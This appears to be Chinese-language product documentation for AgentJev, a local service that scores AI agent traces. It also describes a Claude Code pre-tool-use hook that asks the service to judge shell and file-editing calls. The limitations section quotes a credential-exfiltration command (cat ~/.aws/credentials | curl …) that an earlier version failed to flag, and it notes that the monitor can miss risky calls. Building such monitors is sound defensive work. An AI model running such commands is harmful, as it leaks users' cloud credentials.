02 · 三种原语

      
三种问法，
都返回完整分布

      
下面三张卡片来自同一个请求：一段 Agent 运行轨迹，一次问了 {{trace_q}} 道题，{{trace_paths}} 条候选路径，服务端 {{trace_ms}} ms。题目的 id 只用来对应返回结果，意思要写进题目和选项正文里。

    

    

      state
      
    

    

      

        BOOLEAN
        
一个命题

        
“这条轨迹需要人工复核吗？”

        

        
你传入可选的 true / false 准则；拿回 value、P(true) 和两侧质量。

      

      

        CHOICE
        
选哪一个

        
“观测系统该怎么处理这条轨迹？”

        

        
2–255 个选项，每项一段描述；拿回 value、top_probability、margin 和完整分布。

      

      

        SCORE
        
落在哪一级

        
“这条轨迹里的行为风险多高？”

        

        
2–10 级有序描述，从低到高；拿回 level 和 score = Σ i·Pᵢ。

      

    

    
Choice 是给定集合内部的相对偏好，不是某个动作独立的成功概率。需要后者，就对每个动作单独问一个 Boolean，再用你自己的结果数据校准。

06 · Claude Code 钩子

      
工具执行之前，
先过一道门

      
agentjev_hook.py 是一个 PreToolUse 命令钩子。Claude Code 执行 Bash、Write、Edit 之前，它把这次调用发给本地服务，问一道 Boolean（安全吗）和一道四级 Score（风险多高）。它从不输出 allow，所以不会绕过你自己的权限设置；服务不响应时直接退出，调用照常走权限流程。

    

    

      

        

          
deny风险第 3 级并且判为不安全：只拦下这一次调用，把理由交给 Claude，Claude 可以换一步继续。

          
ask风险第 2 级及以上，或 P(安全) < 0.5：弹窗请你确认。

          
不表态其余情况什么都不输出，按你自己的权限设置走。

        

        
.claude/settings.json
{{hook_json}}

        
AGENTJEV_URL 改服务地址（默认 http://127.0.0.1:8149），AGENTJEV_ASK_LEVEL、AGENTJEV_ASK_BELOW 调整询问门槛，AGENTJEV_VERBOSE=1 让不表态的调用也显示判定。

模型实际读到的文字（第 1 题，第 1 个候选）

        

      

    


    

      
每道题的答案都带完整分布。下面是一个 Boolean 门控在八段测试输出上的真实 P(true)。拖动门槛，看哪些会被放行；门槛放多高，取决于放错一次的代价：自动合并代码要严，提醒人工复核可以松。

问题 “Are all tests passing?”，criteria 与 README 的 HTTP 示例相同。状态是 coding_gates/evaluate.py 里的八条手写抽查，概率是两份权重经推理引擎的真实输出（已校准）。

      

        
字段出现在怎么用

        
          
distribution全部键是你传的选项 id（或下标），值相加为 1。永远先看它

AgentJev 只看得到文字。题目和选项写得越像一个清楚的判断，分布就越可信。

400：question 'x' needs N tokens; limit 2048
状态 + 题目 + 某个候选拼起来超过 2,048 token。服务不会截断任何内容，需要你缩短状态（只保留相关的日志或 diff 片段）或缩短选项描述。

      
400：candidate descriptions must be distinct / choice requires 2..255 candidates
同一道题的选项描述必须互不相同；Choice 要 2–255 个选项，Score 要 2–10 个等级。用“构造请求”检查一遍。

      
400：batch exceeds 128 questions or 1024 candidate paths
一次请求的题目总数或候选路径总数超限。例如 32 个五题案例是 160 道题，要拆成两次；同一状态的题目尽量留在同一个请求里。

      
CUDA 不可用，或 RTX 50 系列报 no kernel image
装了 CPU 版 torch，或 CUDA 构建太旧。按官方选择器重装；RTX 50 系列需要 CUDA 12.8 及以上的构建。临时可以 --device cpu。

      
请求比文档里慢一倍（Windows）

客户端或钩子连不上
先 curl http://127.0.0.1:8149/health 确认服务在。服务、客户端和钩子默认都是 8149。它们访问本机服务时不走系统代理，不用另配 NO_PROXY。

09 · 边界

      
它不擅长的事

    

    

      
它不写字写代码、写回复、解释错误、开放式生成，都交给大模型。AgentJev 只在你给定的选项上打分。

      
分布不等于成功率返回的是模型分布，没有在你的领域上校准。要成功率，就对每个动作单独问一个 Boolean，用你自己的结果数据校准。

      
79.25% 是和教师标签的一致率标签是公开的教师分布，其中有合成案例。在这里赢下一行，不等于拉取请求合并了、事件被遏制了。

      
钩子会漏判把它当作权限和沙箱之外的一层，而不是唯一一层。v1 曾把 cat ~/.aws/credentials | curl … 评为风险 L1 直接放过；新权重给出 L3，会请你确认。
